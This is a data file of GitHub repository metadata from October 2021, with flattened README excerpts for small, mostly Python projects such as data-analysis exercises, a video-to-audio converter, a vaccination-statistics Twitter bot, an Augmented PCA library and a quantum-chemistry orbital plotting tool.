417899203;ffbaropy;https://github.com/kwogger/ffbaropy;Mustache;2021-10-16T17:27:56Z;1;1;1;kwogger's quick instructions  ffmpeg should either be in your path or root of the script modify ffbaro.py to point to the right files uses python venv, so remember to trigger the activate script one day I'll clean it up and package this properly  
417903287;PolynomialCalculatorWithArrays;https://github.com/tnhenga/PolynomialCalculatorWithArrays;Python;2021-10-16T17:44:50Z;0;0;0;
417945641;AnonBot;https://github.com/dlchamp/AnonBot;Python;2021-10-16T20:52:00Z;0;0;0;
417971710;OCR-and-Face-Recognition;https://github.com/pathiksshah/OCR-and-Face-Recognition;;2021-10-16T23:25:37Z;0;0;0;OCR-and-Face-Recognition Python script to convert news paper images to text and extract images Search for a word, and the script extracts faces found on page that contains the word. Libraries: Pytesseract open cv2 numpy zipfile 
417932797;Prosody-Project;https://github.com/apelzz/Prosody-Project;Python;2021-10-16T19:54:07Z;0;0;0;Prosody-Project Praat/Python scripts for stimuli-creation, data prep and analysis for a prosody project 
417901434;iot-esp32;https://github.com/natanael19vitorino/iot-esp32;Python;2021-10-16T17:36:56Z;0;0;0;iot-esp32 Development of embedded software for remote API access using the ESP32 microcontroller, Python and Firebase. 
417890700;airflow_pybr2021;https://github.com/williangl/airflow_pybr2021;Python;2021-10-16T16:55:07Z;0;0;0;airflow_pybr2021 Código do tutorial de Airflow ministrado por Tarsis Azevedo e Sávio Teles na Python Brasil 2021 iniciar o webserver do airflow poetry run airflow webserver -p 8081 iniciar o scheduler sem as DAGs de exemplo: AIRFLOW__CORE__LOAD_EXAMPLES=False poetry run airflow scheduler --subdir dags build docker image docker build . -t pybr_tutorial 
417955793;AI-traffic-lights;https://github.com/MichalMiekina/AI-traffic-lights;;2021-10-16T21:45:22Z;0;0;0;AI-traffic-lights Python machine learning for traffic lights and visualization at website with JS 
417961471;find_musk;https://github.com/lugabiel/find_musk;Python;2021-10-16T22:16:20Z;1;1;0;find_musk Usando cv2 para me encontrar na imagem de participantes da Python Brasil 2021 Para executar o programa na linha de comando $: python findmusk.py --image foto-oficial.jpg --template foto-gabriel.jpg 
417898013;asciiViGen;https://github.com/JanInInternet/asciiViGen;Python;2021-10-16T17:23:32Z;0;0;0;
417909127;MeanMedianMode;https://github.com/OmGautam/MeanMedianMode;Python;2021-10-16T18:07:48Z;0;0;0;MeanMedianMode I calculated the mean, median, and mode of a data set using python. 
417890262;compbio-tools-for-the-bench;https://github.com/jo-klein/compbio-tools-for-the-bench;Python;2021-10-16T16:53:21Z;0;0;0;"compbio-tools-for-the-bench Computational biology tools for bench scientists who are new to Python and bash scripting This repo contains computational biology tools for common tasks in biology research. They are short well-commented scripts that I've written to support my research activities. The scripts are primarily focused on enabling the expert bench researcher to generate and manipulate nucleic acid sequences as well as prepare, execute, and analyze NGS experiments from start to finish (while learning some Python in the process). The scripts are run from the command line in Terminal (Mac, PC, Linux). If this is new to you, don't worry. I've written a simple guide (see GETTING_STARTED.txt) that will get you up an running in 30 minutes or less even if you've never used the command line before. All of the Python (.py) and bash (.sh) scripts are run as follows:   Open your preferred command line terminal application.   Navigate to the location of the script.   At the command line prompt (using "">"" below as an example) enter the following and press enter:  name_of_the_script.ext argument_1 argument_2 argument_3 ... argument_n    The ""arguments"" could be DNA sequences, chromosome coordinates, or some customizable options you want to tell the script to use. Just read the script header for instructions. Many of the tools rely on tools that others have created called ""dependencies"" that will be listed in the script headers or the import sections below them. If you've already learned how to use pip or conda or you've already read GETTING_STARTED.txt, then you know what to do. Feel free to use, modify, repurpose, and stitch them together with others to make the scripts you need. I enjoy coding for fun. If you need a simple script that isn't here or elsewhere, let me know and I'll give it a try if I have the time! "
417944646;Need-a-Sentry-Here;https://github.com/memrecakal/Need-a-Sentry-Here;Python;2021-10-16T20:47:46Z;0;0;0;Need-a-Sentry-Here A friendly sentry that uses python and mediapipe for image processing. The project is still in development, however the pose recognition system for target aiming is up and running. Solid models are currently being drawn and prepared for production. Necessary servo motors and arduino controls will also be developed in the near future.  
417959726;pyjams;https://github.com/mcuntz/pyjams;Python;2021-10-16T22:06:07Z;0;0;0;pyjams A general Python package with miscellaneous utility functions used in several other packages.          About pyjams pyjams is a general Python package offering miscellaneous functions in different categories, such as reading different file formats, Julian date routines, or calculating Elementary Effects. It has several subpackages offering constants or special functions, or objective functions to be used with mod:scipy.optimize. The package modernises and makes available routines of the JAMS Python library, which was created 2009 by Matthias Cuntz while at the Department of Computational Hydrosystems, Helmholtz Centre for Environmental Research - UFZ, Leipzig, Germany, and continued while at Institut National de Recherche pour l'Agriculture, l'Alimentation et l'Environnement (INRAE), Nancy, France. The complete documentation of pyjams is available at:  http://pyjams.readthedocs.org/en/latest/  Installation The easiest way to install is via pip: pip install pyjams  Requirements  numpy scipy     Content  Modules and functions are currently provided in the following categories:  Math Miscellaneous     Functions and modules (alphabetical)   Function/module Short description    :mod:`~pyjams.const` Physical, mathematical, computational, isotope, and material constants.  :meth:`~pyjams.morris_method.elementary_effects` Morris measures mu, stddev and mu*  :mod:`~pyjams.functions` Special functions for testing optimisations, sensitivity analysis, several forms of the logistic function and its derivatives, and other functions to be used with :mod:`scipy.optimize`.  :meth:`~pyjams.morris_method.morris_sampling` Sampling of optimised trajectories for Morris measures / Elementary Effects  :meth:`~pyjams.screening` Parameter screening using Morris' method of Elementary Effects.  :meth:`~pyjams.tee` Prints arguments on screen and in file, like Unix/Linux tee utility.     Functions and modules per category  Math   Function/module Short description    :meth:`~pyjams.morris_method.elementary_effects` Morris measures mu, stddev and mu*  :mod:`~pyjams.functions` Special functions for testing optimisations, sensitivity analysis, several forms of the logistic function and its derivatives, and other functions to be used with :mod:`scipy.optimize`.  :meth:`~pyjams.morris_method.morris_sampling` Sampling of optimised trajectories for Morris measures / Elementary Effects  :meth:`~pyjams.screening` Parameter screening using Morris' method of Elementary Effects.       Miscellaneous   Function/module Short description    :mod:`~pyjams.const` Physical, mathematical, computational, isotope, and material constants.  :meth:`~pyjams.tee` Prints arguments on screen and in file, like Unix/Linux tee utility.       License pyjams is distributed under the MIT License. See the LICENSE file for details. Copyright (c) 2012-2021 Matthias Cuntz, Juliane Mai, Stephan Thober, and Arndt Piayda The project structure of pyjams was borrowing heavily from the welltestpy package by Sebastian Müller. 
417931813;smarthouse;https://github.com/cryslex/smarthouse;Python;2021-10-16T19:50:58Z;0;0;0;smarthouse Smart home system with voice control and interface, written in Python and C ++ 
417894512;PersonalOrganizer;https://github.com/sanyuktatiwari/PersonalOrganizer;Python;2021-10-16T17:09:47Z;0;0;0;PersonalOrganizer This is Python based project, which is designed for personal data handling. 
417893286;Neural_Network_From_Scratch;https://github.com/TA-Engineer/Neural_Network_From_Scratch;;2021-10-16T17:05:05Z;0;0;0;
417976620;Conversor-video-audio;https://github.com/MarlonFL15/Conversor-video-audio;Python;2021-10-17T00:01:01Z;0;0;0;Conversor de vídeo para áudio Programa em python que extrai apenas o áudio de um vídeo. Como usar Para usar o programa, primeiramente clone o projeto e entre no diretório: $ git clone https://github.com/MarlonFL15/Conversor-video-audio.git $ cd Conversor-video-audio  Você também precisa ter baixado o módulo moviepy: $ pip install moviepy  Após isso, você pode abrir o terminal e rodar o arquivo conversor.py, passando como argumento o vídeo que será convertido. $ python conversor.py video.mp4   
417909805;StandardDeviation;https://github.com/OmGautam/StandardDeviation;Python;2021-10-16T18:10:33Z;0;0;0;StandardDeviation In this project I got the standard deviation of a data set using python. 
417904152;ProbabilityMassFunctionPlot;https://github.com/tnhenga/ProbabilityMassFunctionPlot;Python;2021-10-16T17:47:54Z;0;0;0;
417922990;funprojects;https://github.com/coldsmoke4776/funprojects;;2021-10-16T19:11:17Z;1;1;0;funprojects Codecademy, Python or any other fun-sounding code projects in various languages 
417915874;SCOFIELD-VOICE-ASSISTANT;https://github.com/Navodayavarmak/SCOFIELD-VOICE-ASSISTANT;Python;2021-10-16T18:37:41Z;1;1;0;SCOFIELD-VOICE-ASSISTANT THIS IS BRAND NEW SCOFIELD VOICE ASSISTANT PROJECT DESIGNED USING PYTHON(3.10) IN THIS I ADDED A LOT OF FUNCTIONALITIES TO IT AND WE CAN ADD MORE, ITS AN PYTHON-INTERMEDIATE LEVEL PROJECT REQUIREMENTS ARE----> import pyttsx3 (TO CONVERT TEXT TO SPEECH) import datetime (TO WORK ON DATES AND TIME) import speech_recognition as sr (TO GIVE VOICE COMMANDS) import wikipedia (TO GET VERIFIED AND CORRECT RESPONSES FRON GOOGLE) import webbrowser (TO WORK ON DIIFERENT SITES AND IT IS PRE INSTALLED LIB) import os import random (THIS IS UESD TO WORK ON RANDOM ONES..) import smtplib (THIS IS PRE INSTALLED MODULE USED TO SEND EMAILS) import pyjokes (USED TO GET RANDOM JOKES FROM WEB) import pywhatkit (VERY INTRESTING MODULE USED TO SEND AUTOMATE WHATSAPP MSGS ,TEXT TO HAND WRITING AND PLAY ON YOUTUBE..) ANY DOUBTS REGARDING CODE FEEL FREE TO MSG ,FOR EMAIL CHECK MY PROFILE 
417950966;Telecom-Churn-Case-Study;https://github.com/rishabchandna/Telecom-Churn-Case-Study;Jupyter Notebook;2021-10-16T21:19:25Z;1;1;0;Telecom-Churn-Case-Study In this project, the objective is to analyse customer-level data of a leading telecom firm, build predictive models to identify customers at high risk of churn and identify the main indicators of churn.The dataset contains customer-level information for a span of four consecutive months - June, July, August and September. The business objective is to predict the churn in the last (i.e. the ninth) month using the data (features) from the first three months 
417949143;Rainforest-API;https://github.com/Rodcode47/Rainforest-API;JavaScript;2021-10-16T21:10:38Z;0;0;0;Rainforest-API Rainforest is the real-time AMZ Product Data API you've been looking for. Extract structured JSON from AMZ using our API. Get started for free! 100% success rate. JSON or others. See the Demo at CodeSandBox  
417966164;Airplane-Passenger-Satisfaction;https://github.com/jofawj/Airplane-Passenger-Satisfaction;Python;2021-10-16T22:47:04Z;0;0;0;Airplane-Passenger-Satisfaction 
417950557;diff-shades;https://github.com/ichard26/diff-shades;Python;2021-10-16T21:17:06Z;1;1;0;diff-shades The Black shade analyser and comparison tool. AKA Richard's personal take at a better black-primer (by stealing ideas from mypy-primer) :p Basically runs Black over millions of lines of code from various open source projects. Why? So any changes to Black can be gauged on their relative impact. Features include:  Simple but readable diffing capabilities Repeatable analyses via --repeat-projects-from Structured JSON output per-project python_requires support Oh and of course, pretty output!  Potential tasks / additionals:  jupyter notebook support even more helpful output stronger diffing abilities better UX (particularly when things go wrong) so much code cleanup - like a lot :p  Notice: this is a in-progress rewrite of the original diff-shades. I'm rewriting it as the code was quite unmaintainable as I built it wayy too fast. This time I'm focusing on building a good project structure, prettifying the output, and improving functionality. The thing is that this is a WIP so the claimed features above aren't accurate right now. Installation   Clone the repository   Do a local pip install in the project root (eg. python -m pip install .)   Usage todo: finish the readme once done with the rewrite 
417888884;subenum;https://github.com/learnersumedh/subenum;Python;2021-10-16T16:47:22Z;0;0;1;subenum It is Simple Subdomain Enumerator 
417926812;Tarefa_DIO_Contador_Palavras;https://github.com/rodolfodalvi/Tarefa_DIO_Contador_Palavras;Python;2021-10-16T19:27:27Z;0;0;0;
417904576;Dimensional_analysis;https://github.com/chr218/Dimensional_analysis;Python;2021-10-16T17:49:43Z;0;0;0;"Dimensional_analysis Python script to generate a set of dimensionless quantities given user input of variables and their respective fundamental units. The script reproduces Example 7. on pg 503 within ""Advanced Engineering Mathematics"" by Michael Greenberg. (second edition). "
417971830;pyStrap;https://github.com/philmish/pyStrap;Python;2021-10-16T23:26:37Z;0;0;0;
417885694;Robo-Advisor;https://github.com/douglasg-fintec/Robo-Advisor;Python;2021-10-16T16:33:49Z;0;0;0;Robo-Advisor Combine  AWS skills with Python superpowers to create a bot that will recommend an investment portfolio for a retirement plan. 
417903477;urlshortner;https://github.com/AbhishekakaArron/urlshortner;Python;2021-10-16T17:45:27Z;0;0;0;
417888146;VacunacionGal;https://github.com/sergio-alv-per/VacunacionGal;Python;2021-10-16T16:44:15Z;0;0;0;VacunacionGal Programa en Python que procesa los datos proporcionados por el Ministerio de Sanidad sobre la vacunación en España y publica tweets con dichos datos actualizados, específicamente sobre la vacunación en Galicia. Este programa se utiliza para la publicación de los datos en @VacunacionGal, en Twitter. Ejecución del programa Para ejecutar el programa se requiere de una base de datos PostgreSQL con la estructura apropiada y las claves de la API de la cuenta de Twitter donde se publicarán los tweets. La URL de la base de datos y las cuatro claves de la API deben ser variables del entorno en donde se ejecute el programa, específicamente con los nombres BDD_URL, CONSUMER_KEY, CONSUMER_SECRET, KEY y SECRET. En cada ejecución, el programa accede a la página web del Ministerio de Sanidad y intenta descargar el archivo que contiene la información necesaria. Si se produce algún error en este proceso (habitualmente que el archivo aún no esté subido), el programa aborta su ejecución. Si el programa detecta que ya ha leído el informe de hoy y publicado la información, no hace nada. El programa está diseñado para ser ejecutado periódicamente. 
417942671;Projectile-Launch-Range;https://github.com/meai2/Projectile-Launch-Range;Python;2021-10-16T20:38:09Z;0;0;0;Projectile-Launch-Range Python function that accepts inputs and returns the calculated range as an output using the provided starter code For a projectile launched with a velocity v [m/s) at an angle to the horizontal θ [rad], the horizontal distance travelled (also called the range) is given by a formula where the altitude of the landing position is Δh higher than that of the launch position and g is the gravitational acceleration (use 9.81 m/s^2). Note: θ in the formula is in radians. 
417925939;augmented-pca;https://github.com/burneracct123/augmented-pca;Python;2021-10-16T19:23:52Z;0;0;0;"Augmented Principal Component Analysis Overview This library provides Python implementation of Augmented Principal Component Analysis (Augmented PCA) - a family of linear factor models that find a set of factors aligned with an augmenting objective in addition to the canonical PCA objective of finding factors that represent the data variance. AugmentedPCA can be split into two general families of models: adversarial AugmentedPCA and supervised AugmentedPCA. Supervised AugmentedPCA In supervised AugmentedPCA (sAPCA), the augmenting objective is to make the factors aligned with the data labels, or some outcome, in addition to having the factors explain the variance of the original observed or primary data. Below is a diagram depicting the relationship between primary data, supervision data, and the resulting sAPCA factors.  Adversarial AugmentedPCA In adversarial AugmentedPCA (aAPCA), the augmenting objective is to make the factors orthogonal to a set of concomitant data, in addition to having the factors explain the variance of the original observed or primary data. Below is a diagram depicting the relationship between primary data, concomitant data, and the resulting aAPCA factors.  Documentation Documentation for AugmentedPCA is available on this documentation site. Provided documentation includes:   Motivation - Motivation behind AugmentedPCA models and the different approximate inference strategies.   Model formulation - Overview of different models and approximate inference strategies as well as more in-depth mathematical descriptions.   Tutorials - Step-by-step guide on how to use the different offered AugmentedPCA models.   Examples - Use case examples for the different models.   Dependencies The AugmentedPCA library is written in Python, and requires Python >= 3.6 to run. AugmentedPCA relies on the following libraries and version numbers:  Python >= 3.6 NumPy >= 1.19.2 SciPy >= 1.5.2  Installation To install the latest stable release, use pip. Use the following command to install: $ pip install augmented-pca  Issue Tracking and Reports Please use the GitHub issue tracker associated with the AugmentedPCA repository for issue tracking, filing bug reports, and asking general questions about the library or project. Quick Introduction A quick guide to using AugmentedPCA is given in this section. For a more in-depth guide, see our documentation. Importing AugmentedPCA Models APCA models can be imported from the models.py module. Below we show an example of importing the aAPCA model. # Import all AugmentedPCA models from apca.models import aAPCA Alternatively, all offered AugmentedPCA models can be imported at once. # Import all APCA models from apca.models import * Instantiating AugmentedPCA Models APCA models are instantiated by assigning either an aAPCA or sAPCA object to a variable. During instantiation, one has the option to define parameters n_components, mu, which represent the number of components and the augmenting objective strength, respectively. Additionally, approximate inference strategy can be defined through the inference parameter. # Define model parameters n_components = 2        # factors will have dimensionality of 2 mu = 1.0                # augmenting objective strength equal to 1  inference = 'encoded'   # encoded approximate inference strategy  # Instantiate adversarial AugmentedPCA model aapca = aAPCA(n_components=n_components, mu=mu, inference=inference) Fitting AugmentedPCA Models APCA models closely follow the style and implemention of scikit-learn's PCA implementation, with many of the same methods and functionality. Similar to scikit-learn models, AugmentedPCA models are fit using the fit() method. fit() takes two parameters: X which represents the matrix of primary data and Y which represents the matrix of augmenting data. # Import numpy import numpy as np  # Generate synthetic data # Note: primary and augmenting data must have same number of samples/same first dimension size n_samp = 100 X = np.random.randn(n_samp, 20)   # primary data, 100 samples with dimensionality of 20 Y = np.random.randn(n_samp, 3)    # concomitant data, 100 samples with dimensionality of 3  # Fit adversarial AugmentedPCA instance aapca.fit(X=X, Y=Y) Alternatively, AugmentedPCA models can be fit using the fit_transform() method, which takes the same parameters as the fit() method but also returns a matrix of components or factors. # Fit adversarial AugmentedPCA instance and generate components S = aapca.fit_transform(X=X, Y=Y) Approximate Inference Strategies In this section, we give a brief overview of the different approximate inference strategies offered for AugmentedPCA. Inference strategy should be chosen based on the data on which the AugmentedPCA model will be used as well as the specific use case. Both aAPCA and sAPCA models use the jointly-encoded approximate inference strategy by default. Local In the local approximate inference strategy, the factors (local variables associated with each observation) are included in both the likelihood relating and the augmenting objective. Below is a diagram from our paper depicting the local inference strategy.  Because the local variables are included in the augmenting objective, given new data we must have both primary and augmenting data to obtain factors. Thus, the local inference strategy should only be used for inference on new data when both primary and augmenting data are available. Below we show an example of how to fit a sAPCA model with local approximate inference strategy to training data and obtain factors for test data. # Import numpy import numpy as np  # Import supervised APCA from apca.models import sAPCA  # Generate synthetic data and labels n_samp = 100 X = np.random.randn(n_samp, 20) Y = np.random.randint(low=0, high=1, size=(n_samp, 1), dtype=int)  # Generate test/train splits train_pct = 0.7 idx = np.arange(start=0, stop=101, step=1, dtype=int) np.random.shuffle(idx) n_train = int(train_pct * len(idx)) train_idx = idx[:n_train] test_idx = idx[n_train:]  # Split data into test/train sets X_train = X[train_idx, :] X_test = X[test_idx, :] Y_train = Y[train_idx, :] Y_test = Y[test_idx, :]  # Instantiate supervised AugmentedPCA model with local approximate inference strategy sapca = sAPCA(n_components=3, mu=5.0, inference='local')  # Fit supervised AugmentedPCA model sapca.fit(X=X_train, Y_train)  # Generate components for test set # Note: both primary and augmenting data are needed to obtain factors S_test = sapca.transform(X=X_test, Y=Y_test) Note that when factors are generated for the test set that the transform() method requires both the primary data X_test and labels Y_test be passed as parameters. For a more in-depth description of the local approximate inference strategy, see our paper or the corresponding documentation section. Encoded In the encoded approximate inference strategy, a linear encoder is used to transform the data into factors or components. This inference strategy is termed ""encoded"" because the augmenting objective is enforced via the encoder. Below is a diagram depicting the encoded inference strategy.  In contrast to the local inference strategy, when factors are generated for the test set under the encoded inference strategy the transform() method only requires the primary data X_test. Below we show an example of how to fit a sAPCA model with encoded approximate inference strategy to training data and obtain factors for test data. # Instantiate supervised AugmentedPCA model model with encoded approximate inference strategy sapca = sAPCA(n_components=3, mu=5.0, inference='encoded')  # Fit supervised AugmentedPCA model # Note: both primary and augmenting data are required to fit the model sapca.fit(X=X_train, Y_train)  # Generate components for test set # Note: only primary data are needed to obtain factors S_test = sapca.transform(X=X_test) For a more in-depth description of the encoded approximate inference strategy, see the corresponding documentation section. Jointly-Encoded The jointly-encoded approximate inference strategy is similar to the encoded in that the augmenting objective is enforced through a linear encoding matrix. However, in the jointly-encoded inference strategy both the primary and augmenting data are required for computing factors, similar to the local inference strategy. Below is a diagram depicting the jointly-encoded inference strategy.  Similar to the local inference strategy, when factors are generated for the test set under the jointly-encoded inference strategy the transform() method requires both the primary data X_test and augmenting data Y_test. Below we show an example of how to fit a sAPCA model with jointly-encoded approximate inference strategy to training data and obtain factors for test data. # Instantiate supervised AugmentedPCA model model with encoded approximate inference strategy sapca = sAPCA(n_components=3, mu=5.0, inference='encoded')  # Fit supervised AugmentedPCA model # Note: both primary and augmenting data are required to fit the model sapca.fit(X=X_train, Y_train)  # Generate components for test set # Note: both primary and augmenting data are needed to obtain factors S_test = sapca.transform(X=X_test) For a more in-depth description of the jointly-encoded approximate inference strategy, see our paper or the corresponding documentation section. "
417974039;School_District_Analysis;https://github.com/dabarreto/School_District_Analysis;Jupyter Notebook;2021-10-16T23:43:01Z;0;0;0;School_District_Analysis Python code to analize and report standardized test performance trends and patterns at school and district level. 
417893864;chatbot-api;https://github.com/Companion-HTV5/chatbot-api;Python;2021-10-16T17:07:12Z;0;0;0;
417963283;serverless-clients-api;https://github.com/rodrigonavas/serverless-clients-api;Python;2021-10-16T22:26:44Z;0;0;0;Clients API By José Rodrigo Navas Maldonado Technologies used   Python, with Flask for the API   AWS DynamoDB, as non-relational database   AWS CloudFormation, with the help of SAM to manage infrastructure as code   AWS Lambda, for the serverless deployment   
417903934;GPFPlot;https://github.com/davidsousarj/GPFPlot;Python;2021-10-16T17:47:03Z;0;0;0;"GPFPlot Version 0.2, October 2021 Created by David Sousa Inspired by G. N. Freitas' DENSPLOT (non-published). Also inspired by Brett Bode's wxMacMolPlt Powered by Python / NumPy / MatPlotLib 1. WHAT IS GPF-PLOT?  GPF-PLOT is a Python script which generates 2D plots of orbitals, electronic densities and GPF density partitioning associated to VB2000 output files. 2. CHANGELOG  Version 0.2, October 2021:  Minor changes for adjusting to VB2000 3.0 / GAMESS 2021 R2 versions. Fixed error in normalization formula. Fixed parse_overlaps when there is more than 10 groups. Fixed parse_gpf when SPHER keyword is on. Added feature to save EPS file and customize Figure DPI.  Version 0.1, July 2020:  Initial release.  3. HOW TO RUN GPF-PLOT  GPF-PLOT uses Python 3.x, so it needs to be installed in your machine. Additional requirements are the NumPy and MatPlotLib libraries. The current version of GPF-PLOT (0.2) was tested with Python 3.8.2, NumPy 1.17.4, and MatPlotLib 3.1.2. If the above dependencies are installed, you should be able to run GPF-PLOT by entering the following command in your terminal (you must be in the directory which contains the script): python3 gpfplot.py INPUTFILE where INPUTFILE is a *.gpfplot valid input file. 4. PROGRAM MODES  Currently, GPF-PLOT has 6 program modes: ORB, HFORB, QC, INT, TOT, and PROMPT. ORB and HFORB are respectively for plotting VB2000 and GAMESS output orbitals. QC, INT, and TOT are for plotting the total electronic density (TOT) or its quasi-classical (QC) or interference (INT) densities, for a given set of orbitals. PROMPT is an interactive prompt mode, in which you can ask for the program to plot orbitals and/or densities. For more instructions about the modes, please see the TUTORIAL.md file. 5. HOW TO WRITE THE INPUTFILE  Although INPUTFILE must have the *.gpfplot extension, it is just a plain text in which INPUT VARIABLES are set. In order to set variables, type the name of the variable, followed immediately by an equal sign =, followed immediately by the variable value. Do not use spaces before or after the equal sign. Each line must contain only 1 variable (or none). Variables can be defined in any order. If a variable is defined more than once in the INPUTFILE, the program reads ONLY the FIRST definition and ignore the rest. Lines starting with # are comments (ignored by the program). 5.1 INPUT VARIABLES 5.1.1 Input Files and program mode    VARIABLE DEFAULT VALUE DESCRIPTION     out_file - Name of GAMESS/VB2000 output file with extension.   dens_file - Name of the density matrix file generated by VB2000.   mode PROMPT Action which the program will perform. Possible values:PROMPT: interactive prompt.ORB N: plot Nth VB orbital.HFORB N: plot Nth HF orbital.QC X Y Z:  plot quasi-classical density of orbitals X, Y, Z, ...INT X Y Z: plot interference density of orbitals X, Y, Z, ... (minimum of 2 orbitals).TOT X Y Z: plot total density of orbitals X, Y, Z, ...    5.1.2 Geometry Settings    VARIABLE DEFAULT VALUE DESCRIPTION     plane xy Spatial plane where densities will be evaluated (options: xy, xz, yz, yx, zx, zy).   gridp 50 Number of points of the generated grid in each dimension (2D plot).   xlim -1,1 Range for horizontal axis of the plot (Å).   ylim -1,1 Range for vertical axis of the plot (Å).   offset 0.0 Value of the coordinate parallel to cartesian plane chosen for plotting.    5.1.3 Plot Settings    VARIABLE DEFAULT VALUE DESCRIPTION     c_lines yes Option for plotting isovalue lines (yes/no).   c_fill yes Apply filled contour plot (yes/no).   c_label no Include labels int the isovalue lines (yes/no).   color_f coolwarm (mode = ORB, HFORB or PROMPT)seismic_r(mode = QC, INT or TOT) Colormap for filled contour plot. See section [6.1] for available colormaps.   color_l - Colormap for isovalue lines. If not set, lines will be plotted in black. See section [6.1] for available colormaps.   nconts 10 Number of contour isolines and/or color changes in filled contour plot.   min_c -1.0(mode = ORB, HFORB or PROMPT)-0.1(mode = QC, INT or TOT) Minimum value for contour isovalue lines.   max_c 1.0(mode = ORB, HFORB or PROMPT)-0.1(mode = QC, INT or TOT) Minimum value for contour isovalue lines.   auto_c no If set yes, it defines min_c and max_c automatically according to the range of grid values.   p_unit angs Length unity in the plot axes. If not set angs (Å), plot will be shown in atomic units (Bohr radius).   draw_atom plane Which atoms will be shown on the plot. Possible values:all: All atoms are projected on the plotted plane and shown on the plot.plane: Only atoms on the plotted plane and 0.1 Å or less away from the plotted plane are shown on the plot.none: No atom is shown on the plot.   draw_name yes Whether atoms are represented on the plot by name (the labels given in $DATA section from GAMESS). If ""no"", atoms are represented by a black dot.    5.1.4 External File Settings    VARIABLE DEFAULT VALUE DESCRIPTION     save_png -   (300) File name for saving the plot as a *.png image. The variable is optional and is not used if mode = PROMPT. The second argument must be separated by a blankspace and corresponds to the figure resolution in DPI (dots per inch). The default value is 300.   save_eps -   (300) File name for saving the plot as a *.eps  image. The variable is optional and is not used if mode = PROMPT. The second argument must be separated by a blankspace and corresponds to the figure resolution in DPI (dots per inch). The default value is 300.   save_txt - File name for saving the grid points of the plot in a text file (*.txt). The variable is optional and is not used if mode = PROMPT. The format specification is quite intuitive and can be seen in the tutorial example.    Please check the file TUTORIAL.md for further information. 6. RESOURCES  6.1 AVAILABLE COLORMAPS Matplotlib provides a huge number of colormaps. They can be checked out here. The recommended colormaps for using in GPF-PLOT are shown in the image examples/useful_colormaps.png. My personal favorite is coolwarm for plotting orbitals and seismic_r for plotting densities. These are the default colormaps mentioned above. Hint: all colormaps can be reversed by adding _r at the end of its name. 6.2 The gpfplot_figure SCRIPT This script is an extra resource, used for generating high-quality figures intended for publishing in papers or books. The figure may contain more than one orbital or density plot. Check TUTORIAL.md for information about how to use it. 7. FINAL REMARKS  There are some improvements wanted for a newer version, but I do not know when I will be able to work on it. Although, any suggestions are welcome. Since the program has not been fully tested, it probably may have bugs. You can send questions and suggestions to Dr. David Sousa. I will be glad to answer any questions and receive any suggestions on improving the program. "
417901592;CarPaymentCalculator;https://github.com/tnhenga/CarPaymentCalculator;Python;2021-10-16T17:37:39Z;0;0;0;
417882270;Simple-Client-Server-System;https://github.com/NickSingerer/Simple-Client-Server-System;Python;2021-10-16T16:20:20Z;0;0;0;Simple-Client-Server-System It's just an example of how to create a server and client system in python. Read through the code and try to understand and not just copy. Python libraries that you have to download:  socket threading time random  
417887722;Minecraft;https://github.com/KrishayR/Minecraft;Python;2021-10-16T16:42:32Z;1;1;0;
417925821;Modelo-de-Vicsek;https://github.com/FedeSS99/Modelo-de-Vicsek;Python;2021-10-16T19:23:24Z;0;0;0;Modelo de Vicsek Este projecto, ubicado en el archivo de Python, brindandose valores especificos a algunas constantes simula lo que sería la dinamica de partículas con movimiento propio e individual pero afectado por el movimiento de sus vecinas dentro de un radio dado y ella misma. Las reglas por las que se rigen son basadas en el trabajo de Vicsek (1995) y la elaboración del proyecto se documentó en el sig. trabajo: https://www.researchgate.net/publication/258357999_On_the_Emergence_of_Collective_Order_in_Swarming_Systems_a_Recent_Debate Y aquí una captura de lo que se estaría observando  Un ejemplo animado, si bien largo, pero de lo que puede aportar el programa se muestra en el siguiente link: https://youtu.be/gdymJIqzINA 
417972776;AWS-EC2-Automation;https://github.com/DominikWawak/AWS-EC2-Automation;;2021-10-16T23:33:23Z;0;0;0;
417955320;Deep-learing-Project;https://github.com/dineshtpalanisamy/Deep-learing-Project;Jupyter Notebook;2021-10-16T21:42:48Z;0;0;0;
417896367;sanborn-maps-bot;https://github.com/palewire/sanborn-maps-bot;Jupyter Notebook;2021-10-16T17:17:22Z;0;0;0;A bot that posts random images from the Library of Congress collection of Sanborn Fire Insurance Company maps Follow it on Twitter at @sanbornmaps 
417936796;AI-virtual-mouse;https://github.com/metantonio/AI-virtual-mouse;Python;2021-10-16T20:10:19Z;0;0;0;This project is based on A.I. hands tracking with opencv, to control mouse Install the python packages of Pipfile on virtual enviroment: $ pipenv install  Start Virtual Enviroment: $ pipenv shell  Run this project: $ pipenv run main2.py  Example Image:  Note You may have to change index of your webcam at main2.py 
417900476;paper_custom_excel;https://github.com/kabutoblanco/paper_custom_excel;;2021-10-16T17:32:55Z;0;0;0;
417930262;bikeshare;https://github.com/mohamed7632/bikeshare;Python;2021-10-16T19:43:33Z;0;0;0;In this project, I made use of Python to explore data related to bike share systems for three major cities in the United States—Chicago, New York City, and Washington.By importing the data and answer interesting questions about it by computing descriptive statistics. 
417904721;wood-block-puzzle;https://github.com/RedCuckoo/wood-block-puzzle;;2021-10-16T17:50:20Z;0;0;0;wood-block-puzzle A laboratory work for Metaprogramming class. A game, written using Python. Take https://play.google.com/store/apps/details?id=com.addswhilessuffers.binds as an example. A Pyxel library is used as a game engine. 
417972300;Analysing-Spam-Collection-Data;https://github.com/srividya-sundaravadivelu/Analysing-Spam-Collection-Data;Jupyter Notebook;2021-10-16T23:30:01Z;0;0;0;Analysing-Spam-Collection-Data This project is done as part of assessment - PGP AI Datascience with Python. This project uses nltk toolkit, CountVectorizer, TF/IDF and Naive Bayes to classify spam and ham messages. 
417925467;DIO_GCDataproc_desafio;https://github.com/sergioinoue/DIO_GCDataproc_desafio;;2021-10-16T19:21:58Z;0;0;0;"DIO_GCDataproc_desafio No Google Cloud Platform Criar um Cluster (Hadoop). Executar um Job (PySpark), rodando um programa python (contador.py) que conta a ocorrência de cada palavra de um arquivo texto (livro.txt). O resultado do Job é a criação da pasta ""resultado"", no bucket, contendo o arquivo ""part-00000"". Copiar o arquivo ""part-00000"" no repositório e criar o arquivo ""resultado.txt"" com a lista das 10 palavras mais usadas em ""livro.txt"". "
417959791;BikeShare-Udacity-project;https://github.com/Elsayed2Z/BikeShare-Udacity-project;Python;2021-10-16T22:06:24Z;0;0;0;BikeShare-Udacity-project Bike Share udaict course 
417977441;python;https://github.com/lmraffyrome/python;Jupyter Notebook;2021-10-17T00:06:08Z;0;0;0;30daysofpython This is a 30 days of Python coding challenge 
417990137;python;https://github.com/yfyfyfu/python;;2021-10-17T01:29:16Z;0;0;0;
